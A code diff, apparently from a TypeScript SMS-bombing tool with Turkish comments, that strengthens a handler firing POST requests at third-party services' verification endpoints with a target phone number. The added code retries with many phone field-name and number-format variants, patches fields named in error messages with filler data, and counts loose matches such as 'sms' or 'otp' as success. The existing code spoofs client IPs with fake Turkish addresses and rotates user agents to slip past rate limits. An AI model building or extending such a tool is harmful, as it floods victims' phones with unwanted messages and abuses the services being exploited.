@@ -329,6 +329,231 @@ class BeefullAdapter implements ProviderAdapter {
   }
 }
 
+// ─── AKILLI ALAN ADI NORMALİZASYONU ──────────────────────────────────────────
+
+/**
+ * Telefon numarası için bilinen tüm alan adı varyantları.
+ * Sıra önemli: en yaygın olanlar başta.
+ */
+const PHONE_VARIANTS = [
+  // prefix yok (ham numara)
+  ['phone', 'Phone', 'PHONE'],
+  ['phoneNumber', 'PhoneNumber', 'phone_number', 'PHONE_NUMBER'],
+  ['mobilePhone', 'MobilePhone', 'mobile_phone', 'mobilePhoneNumber', 'MobilePhoneNumber'],
+  ['mobile', 'Mobile', 'MOBILE'],
+  ['gsm', 'GSM', 'Gsm', 'gsmNumber', 'GsmNumber', 'gsm_number'],
+  ['msisdn', 'MSISDN'],
+  ['tel', 'Tel', 'TEL', 'telephone', 'Telephone'],
+  ['cellphone', 'CellPhone', 'cell_phone', 'cellPhone'],
+  ['number', 'Number', 'phoneNum', 'PhoneNum', 'phone_num'],
+  ['cep', 'CepTelefonu', 'cepTelefonu'],
+];
+
+const EMAIL_VARIANTS = [
+  'email', 'Email', 'EMAIL', 'email_address', 'emailAddress', 'EmailAddress',
+  'mail', 'Mail', 'e_mail', 'eMail',
+];
+
+const FIRSTNAME_VARIANTS = [
+  'first_name', 'firstName', 'FirstName', 'first', 'name', 'Name', 'NAME',
+  'Ad', 'ad', 'isim', 'Isim',
+];
+
+const LASTNAME_VARIANTS = [
+  'last_name', 'lastName', 'LastName', 'last', 'surname', 'Surname',
+  'family_name', 'Soyad', 'soyad',
+];
+
+const PASSWORD_VARIANTS = [
+  'password', 'Password', 'PASSWORD', 'pass', 'Pass',
+  'sifre', 'Sifre', 'şifre', 'Şifre',
+];
+
+/**
+ * Servis yanıtında veya hata mesajında hangi alan adının beklendiğini bulur.
+ * Örn: "phoneNumber is required" → "phoneNumber" döner
+ */
+function extractExpectedField(responseText: string): string | null {
+  const patterns = [
+    /['"](\w+)['"]\s*(is\s+)?(required|missing|not found|gerekli|zorunlu)/i,
+    /(required|missing)\s+field[:\s]+['"]?(\w+)/i,
+    /field\s+['"](\w+)['"]\s+(is\s+)?(invalid|required|missing)/i,
+    /Alan[i]?[:\s]+['"]?(\w+)/i,
+    /parametre[:\s]+['"]?(\w+)/i,
+    /property[:\s]+['"](\w+)['"]/i,
+  ];
+  for (const p of patterns) {
+    const m = responseText.match(p);
+    if (m) return m[1] || m[2] || null;
+  }
+  return null;
+}
+
+/**
+ * Mevcut body içindeki telefon alanını bulur ve tüm varyant gruplarıyla
+ * yeniden yapılandırılmış body alternatifleri üretir.
+ */
+function generatePhoneVariantBodies(originalBody: any, phone: string): any[] {
+  const alt: any[] = [];
+  // Orijinal body'deki telefon değerini tespit et
+  const phoneFormats = [
+    phone,                        // 5XXXXXXXXX
+    `90${phone}`,                 // 905XXXXXXXXX
+    `+90${phone}`,                // +905XXXXXXXXX
+    `0${phone}`,                  // 05XXXXXXXXX
+    `+90${phone.replace(/^0/, '')}`,
+  ];
+
+  for (const formats of PHONE_VARIANTS) {
+    for (const fmt of phoneFormats) {
+      const candidate = { ...originalBody };
+      // Eski telefon alanlarını sil
+      for (const group of PHONE_VARIANTS) {
+        for (const v of group) delete candidate[v];
+      }
+      // Yeni alan adını ekle
+      candidate[formats[0]] = fmt;
+      alt.push(candidate);
+    }
+  }
+  return alt;
+}
+
+/**
+ * Hata yanıtından hangi alanın eksik olduğunu çıkarır ve
+ * o alana denk gelen varyantı body'e dahil eder.
+ */
+function patchBodyFromError(body: any, errorText: string, phone: string, email: string): any | null {
+  const field = extractExpectedField(errorText);
+  if (!field) return null;
+
+  const patched = { ...body };
+  const fieldLC = field.toLowerCase();
+
+  if (PHONE_VARIANTS.flat().map(v => v.toLowerCase()).includes(fieldLC)) {
+    patched[field] = phone;
+    return patched;
+  }
+  if (EMAIL_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
+    patched[field] = email || generateRandomEmail();
+    return patched;
+  }
+  if (FIRSTNAME_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
+    patched[field] = 'Test';
+    return patched;
+  }
+  if (LASTNAME_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
+    patched[field] = 'User';
+    return patched;
+  }
+  if (PASSWORD_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
+    patched[field] = 'Test123!';
+    return patched;
+  }
+  return null;
+}
+
+// ─── AKILLI BAŞARI TESPİTİ ────────────────────────────────────────────────────
+/**
+ * HTTP status + response body üzerinde çok katmanlı başarı tespiti yapar.
+ * Herhangi bir katman "başarılı" dönerse true kabul edilir.
+ */
+function detectSuccess(httpStatus: number, data: any, rawText: string): boolean {
+  // Katman 1: HTTP durum kodu — 2xx veya 3xx
+  if (httpStatus >= 200 && httpStatus < 400) return true;
+
+  // Katman 2: Veri yoksa HTTP durumuna güven
+  if (data == null) return false;
+
+  // Katman 3: Tüm objeyi özyinelemeli tara
+  if (typeof data === 'object') {
+    if (deepScan(data)) return true;
+  }
+
+  // Katman 4: Ham metni kontrol et (HTML veya sade string yanıtlar)
+  if (rawText) {
+    const lc = rawText.toLowerCase();
+    // Açık hata işaretleri varsa başarısız say
+    const failWords = ['hata', 'error', 'fail', 'invalid', 'denied', 'unauthorized', 'forbidden', 'exception', 'timeout', 'not found'];
+    const successWords = ['success', 'başarı', 'gönderildi', 'sent', 'verified', 'sms', 'otp', 'onay', 'tamam', 'ok', 'done', 'accepted'];
+    const hasFail = failWords.some(w => lc.includes(w));
+    const hasSuccess = successWords.some(w => lc.includes(w));
+    if (hasSuccess && !hasFail) return true;
+  }
+
+  return false;
+}
+
+/**
+ * JSON objesini özyinelemeli olarak tüm alan adları ve değerler üzerinde tarar.
+ * Hangi alan adı gelirse gelsin başarı sinyali yakalanır.
+ */
+function deepScan(obj: any, depth = 0): boolean {
+  if (depth > 5) return false; // Sonsuz döngü koruması
+
+  // Değer bazlı kontroller
+  const successValues = new Set([
+    true, 1, '1', 'true', 'ok', 'OK', 'success', 'SUCCESS', 'Success',
+    'sent', 'SENT', 'verified', 'VERIFIED', 'done', 'DONE',
+    'accepted', 'ACCEPTED', 'completed', 'COMPLETED',
+    'common.success', 'SMS sended succesfully!', 'Başarılı', 'başarılı',
+    0 // bazı API'lar 0'ı başarı olarak döner (status: 0)
+  ]);
+  const successKeywords = [
+    'success', 'başarı', 'tamam', 'gönderildi', 'gonderildi',
+    'sent', 'verified', 'accepted', 'completed', 'done', 'ok'
+  ];
+  const failKeywords = [
+    'error', 'hata', 'fail', 'false', 'denied', 'invalid',
+    'unauthorized', 'forbidden', 'exception', 'not found'
+  ];
+  const successKeys = [
+    'success', 'isSuccess', 'successful', 'ok', 'OK', 'Success',
+    'Durum', 'durum', 'result', 'Result', 'status', 'Status',
+    'processStatus', 'responseType', 'Control', 'control',
+    'code', 'Code', 'isError', 'IsError', 'reachable'
+  ];
+
+  for (const key of Object.keys(obj)) {
+    const val = obj[key];
+    const keyLC = key.toLowerCase();
+
+    // Alan adı başarı anahtarı mı?
+    if (successKeys.includes(key)) {
+      if (successValues.has(val)) return true;
+      // isError gibi ters mantıklı alanlar
+      if ((keyLC === 'iserror' || keyLC === 'haserror') && val === false) return true;
+    }
+
+    // Alan adında başarı kelimesi geçiyor mu?
+    if (successKeywords.some(kw => keyLC.includes(kw))) {
+      if (val === true || val === 1 || val === '1' || val === 'true') return true;
+      if (typeof val === 'string' && successKeywords.some(kw => val.toLowerCase().includes(kw))) return true;
+    }
+
+    // String değer başarı kelimesi içeriyor mu?
+    if (typeof val === 'string') {
+      const valLC = val.toLowerCase();
+      const hasSuccess = successKeywords.some(kw => valLC.includes(kw));
+      const hasFail = failKeywords.some(kw => valLC.includes(kw));
+      if (hasSuccess && !hasFail) return true;
+    }
+
+    // İç içe obje/dizi ise özyinelemeli tara
+    if (val && typeof val === 'object') {
+      if (Array.isArray(val)) {
+        for (const item of val) {
+          if (item && typeof item === 'object' && deepScan(item, depth + 1)) return true;
+        }
+      } else {
+        if (deepScan(val, depth + 1)) return true;
+      }
+    }
+  }
+
+  return false;
+}
+
 // ─── ADAPTER REGISTRY ─────────────────────────────────────────────────────────
 
 const adapters: Record<string, ProviderAdapter> = {
@@ -390,68 +615,83 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       email: body.email
     });
 
-    // Stealth Fetch Execution
+    // ─── AKILLI RETRY MOTORU ──────────────────────────────────────────────────
     const fakeIP = getRandomTurkishIP();
-    const isFormData = extraHeaders['Content-Type']?.includes('multipart/form-data');
-    const isFormUrlEncoded = extraHeaders['Content-Type']?.includes('x-www-form-urlencoded');
 
-    let fetchBody: string;
-    let contentType = 'application/json';
+    const doFetch = async (requestBody: any, headers: any) => {
+      const isFormData    = headers['Content-Type']?.includes('multipart/form-data');
+      const isUrlEncoded  = headers['Content-Type']?.includes('x-www-form-urlencoded');
 
-    if (isFormData) {
-      fetchBody = payload;
-      contentType = extraHeaders['Content-Type'];
-    } else if (isFormUrlEncoded) {
-      fetchBody = new URLSearchParams(payload).toString();
-      contentType = 'application/x-www-form-urlencoded';
-    } else {
-      fetchBody = JSON.stringify(payload);
+      let fetchBody: string;
+      let contentType = 'application/json';
+
+      if (isFormData) {
+        fetchBody = requestBody;
+        contentType = headers['Content-Type'];
+      } else if (isUrlEncoded) {
+        fetchBody = new URLSearchParams(requestBody).toString();
+        contentType = 'application/x-www-form-urlencoded';
+      } else {
+        fetchBody = JSON.stringify(requestBody);
+      }
+
+      return fetch(serviceUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': contentType,
+          'User-Agent': getRandomUA(),
+          'X-Forwarded-For': fakeIP,
+          'X-Real-IP': fakeIP,
+          'Origin': new URL(serviceUrl).origin,
+          'Referer': new URL(serviceUrl).origin + '/',
+          'Accept': 'application/json, text/plain, */*',
+          'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+          'Accept-Encoding': 'gzip, deflate, br',
+          'DNT': '1',
+          'Connection': 'keep-alive',
+          ...headers
+        },
+        body: fetchBody
+      });
+    };
+
+    // 1. Deneme: adapter'ın ürettiği body
+    let response = await doFetch(payload, extraHeaders);
+    let responseText = await response.text();
+    let responseData: any;
+    try { responseData = JSON.parse(responseText); }
+    catch { responseData = { raw: responseText.substring(0, 500) }; }
+
+    let isSuccess = detectSuccess(response.status, responseData, responseText);
+
+    // 2. Deneme: hata mesajından alan adını çıkar ve patch et
+    if (!isSuccess) {
+      const patched = patchBodyFromError(payload, responseText, targetPhone, body.email || generateRandomEmail());
+      if (patched) {
+        const r2 = await doFetch(patched, extraHeaders);
+        const t2 = await r2.text();
+        let d2: any;
+        try { d2 = JSON.parse(t2); } catch { d2 = { raw: t2.substring(0, 500) }; }
+        if (detectSuccess(r2.status, d2, t2)) {
+          response = r2; responseText = t2; responseData = d2; isSuccess = true;
+        }
+      }
     }
 
-    const response = await fetch(serviceUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': contentType,
-        'User-Agent': getRandomUA(),
-        'X-Forwarded-For': fakeIP,
-        'X-Real-IP': fakeIP,
-        'Origin': new URL(serviceUrl).origin,
-        'Referer': new URL(serviceUrl).origin + '/',
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'DNT': '1',
-        'Connection': 'keep-alive',
-        ...extraHeaders
-      },
-      body: fetchBody
-    });
-
-    const responseText = await response.text();
-    let responseData;
-    try {
-      responseData = JSON.parse(responseText);
-    } catch {
-      responseData = { raw: responseText.substring(0, 200) };
+    // 3. Deneme: telefon alan adı varyantlarını sırayla dene (ilk başarılıda dur)
+    if (!isSuccess) {
+      const variants = generatePhoneVariantBodies(payload, targetPhone);
+      for (const vBody of variants) {
+        const rv = await doFetch(vBody, extraHeaders);
+        const tv = await rv.text();
+        let dv: any;
+        try { dv = JSON.parse(tv); } catch { dv = { raw: tv.substring(0, 500) }; }
+        if (detectSuccess(rv.status, dv, tv)) {
+          response = rv; responseText = tv; responseData = dv; isSuccess = true;
+          break;
+        }
+      }
     }
-
-    // Başarı kontrolü
-    const isSuccess = response.ok ||
-      responseData?.processStatus === 'Success' ||
-      responseData?.isError === false ||
-      responseData?.successful === true ||
-      responseData?.isSuccess === true ||
-      responseData?.status === 'success' ||
-      responseData?.code === 'common.success' ||
-      responseData?.responseType === 'SUCCESS' ||
-      responseData?.result === 'SMS sended succesfully!' ||
-      responseData?.result === true ||
-      responseData?.Success === true ||
-      responseData?.Control === 1 ||
-      responseData?.code === 50 ||
-      responseData?.status === 0 ||
-      responseData?.Durum === true ||
-      responseData?.message === 'Telefon numaranıza SMS gönderildi';
 
     if (isSuccess) {
       breaker.onSuccess();
